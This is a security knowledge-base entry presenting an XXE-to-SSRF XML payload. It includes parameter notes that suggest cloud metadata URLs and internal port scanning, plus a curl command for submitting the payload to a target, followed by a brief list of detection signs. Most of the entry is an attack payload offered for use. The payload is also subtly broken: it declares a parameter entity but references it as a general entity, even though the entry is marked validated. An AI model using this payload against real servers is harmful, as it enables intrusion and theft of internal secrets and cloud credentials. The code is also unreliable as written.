---
type: code
language: xml
verified: true
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Web
tags:
  - xxe
  - ssrf
  - payload
  - xml
validated: true
---

# XXE-SSRF-Payload-XML

## Code

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "http://internal.service/secret_pass.txt" >
]>
<foo>&xxe;</foo>
```

## Description

This XML code snippet exploits XXE vulnerabilities by defining an external parameter entity (%xxe) that references an internal URL via the SYSTEM keyword. When processed by a vulnerable parser, it forces the server to fetch the specified resource (e.g., a secret file or internal endpoint), enabling SSRF for data exfiltration or reconnaissance. The entity is then referenced in the root element to include the fetched content in the output.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| http://internal.service/secret_pass.txt | Internal URL or resource to fetch via SSRF (replace with target like http://169.254.169.254/latest/meta-data/ for AWS) | http://127.0.0.1:3306/ (for blind port scan) |

## Usage

Save this as an XML file (e.g., xxe-payload.xml) and submit it to a vulnerable endpoint using a tool like curl: `curl -X POST -H "Content-Type: application/xml" --data @xxe-payload.xml http://target.com/endpoint`. Used in web exploitation scenarios to bypass network controls and access internal services. Adapt the URL for specific targets like cloud metadata or local files (using file:// protocol if supported).

## Detection

- XML parser logs showing external entity resolution attempts.
- Application error messages referencing unknown DOCTYPE or entity definitions.
- Network monitoring for outbound requests from the web server to internal IPs/ports.
- WAF rules blocking suspicious XML structures with % entities or SYSTEM keywords.

## Related

- [[procedures/SSRF-via-XXE-Injection]]
- [[commands/curl-send-xxe-payload]]
